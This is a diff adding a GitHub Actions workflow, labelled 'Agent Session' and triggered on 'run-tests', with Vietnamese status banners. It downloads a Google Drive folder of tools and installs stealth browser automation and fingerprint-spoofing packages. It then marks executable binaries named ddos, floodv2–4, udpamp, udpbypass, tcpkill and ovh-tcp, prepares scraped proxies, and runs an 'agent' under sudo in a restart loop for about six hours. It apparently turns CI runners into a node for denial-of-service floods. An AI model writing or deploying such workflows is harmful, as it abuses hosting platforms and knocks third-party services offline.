@@ -1,0 +1,74 @@
+name: Agent Session
+
+on:
+  workflow_dispatch:
+  repository_dispatch:
+    types: [run-tests]
+
+jobs:
+  agent-session:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    continue-on-error: true
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Install dependencies and start agent
+        run: |
+         sudo sed -i 's/azure.archive.ubuntu.com/archive.ubuntu.com/g' /etc/apt/sources.list /etc/apt/apt-mirrors.txt || true
+          sudo apt-get update
+          sudo apt-get install -y xvfb ca-certificates fonts-liberation \
+            libappindicator3-1 libasound2t64 libatk-bridge2.0-0 libatk1.0-0 \
+            libc6 libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 \
+            libgbm1 libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 \
+            libpango-1.0-0 libpangocairo-1.0-0 libstdc++6 libx11-6 \
+            libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 \
+            libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 \
+            libxtst6 lsb-release wget xdg-utils
+
+          pip install gdown
+
+          echo "Downloading files from Google Drive..."
+          gdown https://drive.google.com/drive/folders/1xKpyLS3GL_nLwP3SO4k707IvhoD92mXW?usp=sharing --folder
+
+          cd k
+
+          npm install puppeteer puppeteer-extra puppeteer-extra-plugin-stealth \
+            async axios colors hpack node-bash-title chalk@4 user-agents \
+            random-referer request puppeteer-real-browser \
+            fingerprint-generator fingerprint-injector
+
+          npx puppeteer browsers install chrome@stable
+
+          wget -q https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+          sudo apt install -y ./google-chrome-stable_current_amd64.deb
+
+          chmod +x ddos agent floodv3 floodv2 fjium-hex \
+            udpsvip udpraw udppps udpbypass udpamp udp tcpkill ovh-tcp floodv4
+          node proxy.js
+          python shuffle_proxy.py scraped_proxies.txt
+          python shuffle_proxy.py live.txt
+
+          # Run agent in background
+          sudo ./agent &
+          AGENT_PID=$!
+
+          echo ""
+          echo "╔══════════════════════════════════════════╗"
+          echo "║        ✅ Agent đang chạy!               ║"
+          echo "╠══════════════════════════════════════════╣"
+          echo "║  PID: $AGENT_PID                         ║"
+          echo "║  Session mở trong ~350 phút              ║"
+          echo "╚══════════════════════════════════════════╝"
+          echo ""
+
+          while true; do
+            if ! kill -0 $AGENT_PID 2>/dev/null; then
+              echo "Agent stopped, restarting..."
+              sudo ./agent &
+              AGENT_PID=$!
+            fi
+            sleep 60
+          done
+        timeout-minutes: 350
